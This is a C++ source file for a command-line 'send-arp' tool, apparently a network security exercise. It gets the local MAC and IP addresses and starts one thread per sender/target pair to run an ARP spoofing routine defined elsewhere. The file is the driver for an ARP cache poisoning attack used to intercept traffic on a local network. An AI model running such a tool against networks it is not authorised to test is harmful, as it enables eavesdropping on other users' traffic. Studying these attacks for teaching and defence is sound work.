#include <cstdio>
#include <pthread.h>
#include <pcap.h>
#include "attack.h"

int get_my_mac(char *if_name, char *dst, size_t dst_size) {
    struct ifreq s;
    u_char *mac;
    int fd;
    
    if((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0)
        return -1;

    strncpy(s.ifr_name, if_name, IFNAMSIZ);
     
    if(ioctl(fd, SIOCGIFHWADDR, &s) < 0) {
        return -2;
    }

    mac = (u_char*)s.ifr_addr.sa_data;
    snprintf(dst, dst_size, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return 0;
}


int get_my_ip(char *if_name, char *dst, size_t dst_size) {
    struct ifreq s;
    u_char *mac;
    int fd;
    
    if((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0)
        return -1;
   
    strncpy(s.ifr_name, if_name, IFNAMSIZ);

    if(ioctl(fd, SIOCGIFADDR, &s) < 0) {
        return -2;
    }

    inet_ntop(AF_INET, (char*)s.ifr_addr.sa_data + sizeof(ushort), dst, dst_size);
    return 0;
}

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	char* dev = argv[1];

	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	char my_mac[0x100];
	char my_ip[0x100];

	int pair_size;
	pthread_t *threads;
	spoof_th_arg **spoof_args;

	
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	
	handle = pcap_open_live(dev, PCAP_ERRBUF_SIZE, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	if(get_my_mac(dev, my_mac, sizeof(my_mac)) != 0) {
		perror("get_my_mac_address");
		return -1;
	}

	if(get_my_ip(dev, my_ip, sizeof(my_ip)) != 0) {
		perror("get_my_ip");
		return -1;
	}

	pair_size = (argc-2) / 2;
	threads = (pthread_t*)malloc(pair_size*sizeof(pthread_t));
	spoof_args = (spoof_th_arg**)malloc(pair_size*sizeof(spoof_args[0]));

	for(int i=2; i < argc; i+=2) {
		int idx = (i-2)/2;
		spoof_th_arg * new_spoof_arg = (spoof_th_arg*)malloc(sizeof(spoof_th_arg));
		new_spoof_arg->handle = handle;
		new_spoof_arg->my_mac = Mac(my_mac);
		new_spoof_arg->my_ip = Ip(my_ip);
		new_spoof_arg->sender_ip = Ip(argv[i]);
		new_spoof_arg->target_ip = Ip(argv[i+1]);

		spoof_args[idx] = new_spoof_arg;
		pthread_create(&threads[idx], NULL, th_spoof_proc, (void*)spoof_args[idx]);
	}

	for(int i=0; i < pair_size; i++) {
		pthread_join(threads[i], NULL);
		free(spoof_args[i]);
	}


	pcap_close(handle);
}
